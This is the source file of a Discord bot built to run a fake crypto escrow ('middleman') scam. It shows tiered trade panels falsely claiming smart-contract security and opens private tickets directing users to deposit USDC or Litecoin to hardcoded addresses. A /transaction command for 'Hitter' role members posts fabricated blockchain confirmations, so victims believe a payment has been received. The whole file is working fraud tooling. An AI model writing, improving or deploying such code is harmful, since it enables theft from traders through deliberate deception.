const { Client, GatewayIntentBits, Partials, Events, PermissionFlagsBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { generateFakeTransaction } = require('./blockchain');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Channel, Partials.Message]
});

const OWNER_ID = '1422945082746601594';
const HITTER_ROLE_ID = '1484680314772000902';
const FINANCE_ROLE_ID = '1485363449897681017';

// Hardcoded addresses - ALWAYS USE THESE
const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';

client.config = {
    OWNER_ID,
    HITTER_ROLE_ID,
    FINANCE_ROLE_ID,
    TICKET_CATEGORY: null,
    MANUAL_CATEGORY: null,
    LOG_CHANNEL: null,
    MONITOR_CHANNEL: null
};

client.activeTickets = new Map();
client.ltcPrice = 55.57;

const isOwner = (id) => id === OWNER_ID;
const hasHitter = (m) => m.roles.cache.has(HITTER_ROLE_ID);
const hasFinance = (m) => m.roles.cache.has(FINANCE_ROLE_ID);

// Command definitions
const commands = [
    {
        name: 'panel',
        description: 'Spawn auto middleman panel (Owner only)',
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'manual',
        description: 'Spawn manual middleman panel (Owner only)',
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'tickets',
        description: 'Set auto MM ticket category (Owner only)',
        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'manualcategory',
        description: 'Set manual MM ticket category (Owner only)',
        options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'log',
        description: 'Set fake transaction log channel (Owner only)',
        options: [{ name: 'channel', type: 7, description: 'Channel', required: true }],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'heh',
        description: 'Set monitor channel (Owner only)',
        options: [{ name: 'channelid', type: 3, description: 'Channel ID', required: true }],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    },
    {
        name: 'transaction',
        description: 'Trigger fake transaction (Hitter only)',
        options: [
            { name: 'channelid', type: 3, description: 'Ticket channel ID', required: true },
            { name: 'amount', type: 10, description: 'Amount (optional)', required: false }
        ]
    },
    {
        name: 'close',
        description: 'Close current ticket'
    },
    {
        name: 'say',
        description: 'Send message as bot (Owner only)',
        options: [
            { name: 'channel', type: 7, description: 'Target channel', required: true },
            { name: 'message', type: 3, description: 'Message to send', required: true }
        ],
        defaultMemberPermissions: PermissionFlagsBits.Administrator
    }
];

client.on(Events.GuildCreate, async (guild) => {
    try { await guild.commands.set(commands); } catch (e) { console.error('Cmd reg fail:', e); }
});

client.on(Events.ClientReady, async () => {
    console.log(`✅ Bot logged in as ${client.user.tag}`);
    for (const [, guild] of client.guilds.cache) {
        try { await guild.commands.set(commands); } catch (e) { console.error(`Cmd fail ${guild.name}:`, e); }
    }
});

// Role monitoring
client.on(Events.GuildMemberUpdate, (oldM, newM) => {
    const added = newM.roles.cache.filter(r => !oldM.roles.cache.has(r.id));
    const removed = oldM.roles.cache.filter(r => !newM.roles.cache.has(r.id));
    if (added.has(HITTER_ROLE_ID)) console.log(`[ROLE] +HITTER ${newM.user.tag}`);
    if (removed.has(HITTER_ROLE_ID)) console.log(`[ROLE] -HITTER ${newM.user.tag}`);
    if (added.has(FINANCE_ROLE_ID)) console.log(`[ROLE] +FINANCE ${newM.user.tag}`);
    if (removed.has(FINANCE_ROLE_ID)) console.log(`[ROLE] -FINANCE ${newM.user.tag}`);
});

// Command handler
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isChatInputCommand()) return;
    
    const { commandName, member, user } = interaction;
    console.log(`[CMD] /${commandName} by ${user.tag}`);

    const deny = (msg) => interaction.reply({ content: `❌ ${msg}`, ephemeral: true });

    try {
        switch (commandName) {
            case 'panel':
                if (!isOwner(user.id)) return deny('Owner only.');
                const autoEmbed = new EmbedBuilder()
                    .setTitle('🤖 Automated Middleman')
                    .setDescription('Select your trade amount tier below:')
                    .setColor(0x5865F2)
                    .addFields(
                        { name: 'Tier 1', value: '$200 or under\n**USDC Only**', inline: true },
                        { name: 'Tier 2', value: '$500 or under\n**USDC Only**', inline: true },
                        { name: 'Tier 3', value: '$1000 or more\n**USDC Only**', inline: true }
                    )
                    .setFooter({ text: 'Deposits are automated • Funds secured via smart contract' });
                
                const autoRow = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('auto_tier1').setLabel('$200 or less').setStyle(ButtonStyle.Primary).setEmoji('🥉'),
                    new ButtonBuilder().setCustomId('auto_tier2').setLabel('$500 or less').setStyle(ButtonStyle.Secondary).setEmoji('🥈'),
                    new ButtonBuilder().setCustomId('auto_tier3').setLabel('$1000+').setStyle(ButtonStyle.Success).setEmoji('🥇')
                );
                await interaction.reply({ embeds: [autoEmbed], components: [autoRow] });
                break;

            case 'manual':
                if (!isOwner(user.id)) return deny('Owner only.');
                const manualEmbed = new EmbedBuilder()
                    .setTitle('👤 Manual Middleman Service')
                    .setDescription('Manual middleman service, Please follow the rules and wait patiently')
                    .setColor(0xFFA500)
                    .addFields(
                        { name: 'Tier 1', value: '$200 or under\n**LTC Only**', inline: true },
                        { name: 'Tier 2', value: '$500 or under\n**LTC Only**', inline: true },
                        { name: 'Tier 3', value: '$1000 or more\n**LTC Only**', inline: true }
                    )
                    .setFooter({ text: 'Human middleman will assist you • Be patient' });
                
                const manualRow = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('manual_tier1').setLabel('$200 or less').setStyle(ButtonStyle.Primary).setEmoji('🥉'),
                    new ButtonBuilder().setCustomId('manual_tier2').setLabel('$500 or less').setStyle(ButtonStyle.Secondary).setEmoji('🥈'),
                    new ButtonBuilder().setCustomId('manual_tier3').setLabel('$1000+').setStyle(ButtonStyle.Success).setEmoji('🥇')
                );
                await interaction.reply({ embeds: [manualEmbed], components: [manualRow] });
                break;

            case 'tickets':
                if (!isOwner(user.id)) return deny('Owner only.');
                client.config.TICKET_CATEGORY = interaction.options.getString('categoryid');
                await interaction.reply({ content: `✅ Auto MM ticket category set.`, ephemeral: true });
                break;

            case 'manualcategory':
                if (!isOwner(user.id)) return deny('Owner only.');
                client.config.MANUAL_CATEGORY = interaction.options.getString('categoryid');
                await interaction.reply({ content: `✅ Manual MM ticket category set.`, ephemeral: true });
                break;

            case 'log':
                if (!isOwner(user.id)) return deny('Owner only.');
                client.config.LOG_CHANNEL = interaction.options.getChannel('channel').id;
                await interaction.reply({ content: '✅ Log channel set.', ephemeral: true });
                break;

            case 'heh':
                if (!isOwner(user.id)) return deny('Owner only.');
                client.config.MONITOR_CHANNEL = interaction.options.getString('channelid');
                await interaction.reply({ content: '✅ Monitor channel set.', ephemeral: true });
                break;

            case 'transaction':
                if (!hasHitter(member) && !isOwner(user.id)) return deny('Hitter role required.');
                const chId = interaction.options.getString('channelid');
                const channel = await client.channels.fetch(chId).catch(() => null);
                if (!channel) return deny('Invalid channel ID.');
                
                const fakeTx = generateFakeTransaction();
                const txEmbed = new EmbedBuilder()
                    .setTitle('🔔 New Transaction Detected')
                    .setDescription(`**${fakeTx.amount} ${fakeTx.currency}** ($${fakeTx.usd.toFixed(2)})`)
                    .addFields(
                        { name: 'Transaction ID', value: `\`${fakeTx.txid}\``, inline: false },
                        { name: 'Status', value: '✅ Confirmed', inline: true },
                        { name: 'Confirmations', value: '6+', inline: true },
                        { name: 'From', value: `\`${fakeTx.sender}\``, inline: true },
                        { name: 'To', value: `\`${fakeTx.receiver}\``, inline: true }
                    )
                    .setColor(0x00FF00)
                    .setTimestamp();
                
                await channel.send({ embeds: [txEmbed] });
                await interaction.reply({ content: `✅ Fake transaction sent to <#${chId}>`, ephemeral: true });
                break;

            case 'close':
                if (!interaction.channel.name.includes('ticket')) return deny('Not a ticket channel.');
                await interaction.reply('🔒 Closing ticket in 5 seconds...');
                setTimeout(() => interaction.channel.delete().catch(console.error), 5000);
                break;

            case 'say':
                if (!isOwner(user.id)) return deny('Owner only.');
                const sayChannel = interaction.options.getChannel('channel');
                const sayMessage = interaction.options.getString('message');
                await sayChannel.send(sayMessage);
                await interaction.reply({ content: `✅ Message sent to ${sayChannel}`, ephemeral: true });
                break;
        }
    } catch (err) {
        console.error(`[ERR] /${commandName}:`, err);
        if (!interaction.replied) await interaction.reply({ content: '❌ Error occurred.', ephemeral: true });
    }
});

// Button handler - Auto MM (USDC)
client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    
    const { customId, user } = interaction;
    
    // Auto MM tickets - USDC
    if (customId.startsWith('auto_tier')) {
        const tier = customId.replace('auto_tier', '');
        const limits = { '1': 200, '2': 500, '3': 1000 };
        const limit = limits[tier];
        
        if (!client.config.TICKET_CATEGORY) {
            return interaction.reply({ content: '❌ Auto MM category not set.', ephemeral: true });
        }

        try {
            const ticketCh = await interaction.guild.channels.create({
                name: `auto-${user.username}-t${tier}`,
                parent: client.config.TICKET_CATEGORY,
                permissionOverwrites: [
                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                    { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                    { id: HITTER_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                    { id: FINANCE_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel] }
                ]
            });

            const embed = new EmbedBuilder()
                .setTitle(`🤖 Automated Middleman | Tier ${tier}`)
                .setDescription(`Welcome <@${user.id}>\n**Trade Limit: $${limit}**`)
                .addFields(
                    { name: 'Deposit Address (USDC)', value: `\`${USDC_ADDRESS}\``, inline: false },
                    { name: 'Network', value: 'Ethereum (ERC-20)', inline: true },
                    { name: 'Status', value: '⏳ Awaiting deposit...', inline: true },
                    { name: 'Instructions', value: '1. Send exact USDC amount\n2. Wait for 6 confirmations\n3. Bot releases funds automatically', inline: false }
                )
                .setColor(0x2775CA)
                .setFooter({ text: 'Do not send LTC to this address • USDC only' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('close_ticket').setLabel('Close Ticket').setStyle(ButtonStyle.Danger)
            );

            await ticketCh.send({ content: `<@${user.id}>`, embeds: [embed], components: [row] });
            await interaction.reply({ content: `✅ Auto MM ticket created: ${ticketCh}`, ephemeral: true });
            
            client.activeTickets.set(ticketCh.id, { userId: user.id, tier, type: 'auto', limit, createdAt: Date.now() });
            console.log(`[AUTO TICKET] Tier ${tier} created by ${user.tag}`);

        } catch (e) {
            console.error('[AUTO TICKET ERR]', e);
            await interaction.reply({ content: '❌ Failed to create ticket.', ephemeral: true });
        }
    }
    
    // Manual MM tickets - LTC
    if (customId.startsWith('manual_tier')) {
        const tier = customId.replace('manual_tier', '');
        const limits = { '1': 200, '2': 500, '3': 1000 };
        const limit = limits[tier];
        
        if (!client.config.MANUAL_CATEGORY) {
            return interaction.reply({ content: '❌ Manual MM category not set.', ephemeral: true });
        }

        try {
            const ticketCh = await interaction.guild.channels.create({
                name: `manual-${user.username}-t${tier}`,
                parent: client.config.MANUAL_CATEGORY,
                permissionOverwrites: [
                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                    { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                    { id: HITTER_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                    { id: FINANCE_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel] }
                ]
            });

            const embed = new EmbedBuilder()
                .setTitle(`👤 Manual Middleman | Tier ${tier}`)
                .setDescription(`Welcome <@${user.id}>\n**Trade Limit: $${limit}**`)
                .addFields(
                    { name: 'Deposit Address (LTC)', value: `\`${LTC_ADDRESS}\``, inline: false },
                    { name: 'Network', value: 'Litecoin', inline: true },
                    { name: 'Status', value: '⏳ Waiting for middleman...', inline: true },
                    { name: 'Instructions', value: '1. Wait for middleman to join\n2. Send LTC to address above\n3. Middleman confirms and releases', inline: false },
                    { name: 'Rules', value: '• No chargebacks\n• Verify address before sending\n• Middleman has final say', inline: false }
                )
                .setColor(0xBFBBBB)
                .setFooter({ text: 'Do not send USDC to this address • LTC only' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('close_ticket').setLabel('Close Ticket').setStyle(ButtonStyle.Danger)
            );

            await ticketCh.send({ content: `<@${user.id}> <@&${HITTER_ROLE_ID}>`, embeds: [embed], components: [row] });
            await interaction.reply({ content: `✅ Manual MM ticket created: ${ticketCh}`, ephemeral: true });
            
            client.activeTickets.set(ticketCh.id, { userId: user.id, tier, type: 'manual', limit, createdAt: Date.now() });
            console.log(`[MANUAL TICKET] Tier ${tier} created by ${user.tag}`);

        } catch (e) {
            console.error('[MANUAL TICKET ERR]', e);
            await interaction.reply({ content: '❌ Failed to create ticket.', ephemeral: true });
        }
    }

    if (customId === 'close_ticket') {
        await interaction.reply('🔒 Closing ticket...');
        await interaction.channel.delete().catch(() => {});
    }
});

client.login(process.env.DISCORD_TOKEN);
